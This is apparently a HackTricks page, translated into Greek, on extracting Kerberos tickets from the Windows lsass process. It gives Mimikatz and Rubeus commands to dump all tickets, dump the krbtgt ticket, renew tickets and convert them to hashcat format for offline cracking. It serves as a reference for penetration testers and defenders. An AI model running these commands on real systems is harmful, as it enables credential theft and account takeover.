# Harvesting tickets from Windows

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Τα εισιτήρια στα Windows διαχειρίζονται και αποθηκεύονται από τη διαδικασία **lsass** (Local Security Authority Subsystem Service), η οποία είναι υπεύθυνη για την εκτέλεση πολιτικών ασφαλείας. Για να εξάγουμε αυτά τα εισιτήρια, είναι απαραίτητο να αλληλεπιδράσουμε με τη διαδικασία lsass. Ένας μη διαχειριστικός χρήστης μπορεί να έχει πρόσβαση μόνο στα δικά του εισιτήρια, ενώ ένας διαχειριστής έχει το προνόμιο να εξάγει όλα τα εισιτήρια στο σύστημα. Για τέτοιες λειτουργίες, τα εργαλεία **Mimikatz** και **Rubeus** χρησιμοποιούνται ευρέως, προσφέροντας το καθένα διαφορετικές εντολές και λειτουργίες.

### Mimikatz
Το Mimikatz είναι ένα ευέλικτο εργαλείο που μπορεί να αλληλεπιδράσει με την ασφάλεια των Windows. Χρησιμοποιείται όχι μόνο για την εξαγωγή εισιτηρίων αλλά και για διάφορες άλλες σχετικές με την ασφάλεια λειτουργίες.
```bash
# Extracting tickets using Mimikatz
sekurlsa::tickets /export
```
### Rubeus
Rubeus είναι ένα εργαλείο ειδικά σχεδιασμένο για αλληλεπίδραση και χειρισμό του Kerberos. Χρησιμοποιείται για την εξαγωγή και διαχείριση εισιτηρίων, καθώς και για άλλες σχετικές δραστηριότητες του Kerberos.
```bash
# Dumping all tickets using Rubeus
.\Rubeus dump
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

# Listing all tickets
.\Rubeus.exe triage

# Dumping a specific ticket by LUID
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

# Renewing a ticket
.\Rubeus.exe renew /ticket:<BASE64_TICKET>

# Converting a ticket to hashcat format for offline cracking
.\Rubeus.exe hash /ticket:<BASE64_TICKET>
```
Όταν χρησιμοποιείτε αυτές τις εντολές, βεβαιωθείτε ότι θα αντικαταστήσετε τις θέσεις όπως `<BASE64_TICKET>` και `<luid>` με το πραγματικό εισιτήριο κωδικοποιημένο σε Base64 και το Logon ID αντίστοιχα. Αυτά τα εργαλεία παρέχουν εκτενή λειτουργικότητα για τη διαχείριση εισιτηρίων και την αλληλεπίδραση με τους μηχανισμούς ασφαλείας των Windows.

## Αναφορές
* [https://www.tarlogic.com/en/blog/how-to-attack-kerberos/](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
